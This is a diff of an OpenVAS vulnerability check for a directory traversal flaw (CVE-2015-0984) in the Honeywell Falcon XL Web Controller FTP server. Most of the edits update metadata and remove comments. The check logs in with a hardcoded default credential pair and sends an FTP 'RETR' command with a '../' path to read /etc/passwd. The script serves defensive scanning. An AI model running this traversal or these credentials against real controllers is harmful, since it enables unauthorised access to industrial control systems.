@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_honeywell_xlweb_scada_dir_trav_vuln.nasl 6345 2017-06-15 10:00:59Z teissa $
+# $Id: gb_honeywell_xlweb_scada_dir_trav_vuln.nasl 9552 2018-04-20 12:17:18Z cfischer $
 #
 # Honeywell Falcon XL Web Controller Directory Traversal Vulnerability
 #
@@ -27,11 +27,11 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805540");
-  script_version("$Revision: 6345 $");
+  script_version("$Revision: 9552 $");
   script_cve_id("CVE-2015-0984");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2017-06-15 12:00:59 +0200 (Thu, 15 Jun 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-04-20 14:17:18 +0200 (Fri, 20 Apr 2018) $");
   script_tag(name:"creation_date", value:"2015-04-27 10:42:16 +0530 (Mon, 27 Apr 2015)");
   script_name("Honeywell Falcon XL Web Controller Directory Traversal Vulnerability");
 
@@ -71,79 +71,52 @@ if(description)
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
   script_family("FTP");
-  script_dependencies("secpod_ftp_anonymous.nasl");
+  script_dependencies("ftpserver_detect_type_nd_version.nasl");
   script_require_ports("Services/ftp", 21);
+  script_mandatory_keys("ftp_banner/available");
+
   exit(0);
 }
-
-#
-## The script code starts here
-##
 
 include("ftp_func.inc");
 
-## Get the default port of FTP
-ftpPort = get_kb_item("Services/ftp");
-if(!ftpPort){
-  ftpPort = 21;
-}
-
-## check port status
-if(!get_port_state(ftpPort)){
-  exit(0);
-}
-
-## Get the FTP banner and confirm the application
+ftpPort = get_ftp_port(default:21);
 banner = get_ftp_banner(port:ftpPort);
 if("xlweb FTP server" >!< banner){
   exit(0);
 }
 
-## Open Socket to ftp port
 soc1 = open_sock_tcp(ftpPort);
 if(!soc1){
   exit(0);
 }
 
-# Get Username from KB, If not given use default Username
 user = get_kb_item("ftp/login");
 if(!user){
-  ## Try for default username which could not be changed
   user = "xwadmin";
 }
 
-## Get Password from KB, If not given use default Password
 password = get_kb_item("ftp/password");
 if(!password){
   password = string("kisrum1!");
 }
 
-## Login using above credentials
 login_details = ftp_log_in(socket:soc1, user:user, pass:password);
 
 if(login_details)
 {
-  ## Change to PASV Mode
   ftpPort2 = ftp_get_pasv_port(socket:soc1);
   if(ftpPort2)
   {
-    ## Open a Socket for receiving the data
     soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
     if(soc2)
     {
-      ## Construct and send the attack request to first socket
       attackreq = "RETR ../../../../../../../../etc/passwd";
       send(socket:soc1, data:string(attackreq, "\r\n"));
-
-      ## Receive the data in second socket
       attackres = ftp_recv_data(socket:soc2);
-
-      ## Confirm the Exploit by checking the contents of /etc/passwd file
       if(attackres &&  attackres =~ "root:.*:0:[01]:" && "xwadmin" >< attackres)
       {
         security_message(port:ftpPort);
-
-        ## Close all the connections
         ftp_close(socket:soc1);
         close(soc1);
         close(soc2);
@@ -152,8 +125,6 @@ if(login_details)
       close(soc2);
     }
   }
-  ## Close FTP Connection
   ftp_close(socket:soc1);
 }
-## Close the socket
 close(soc1);
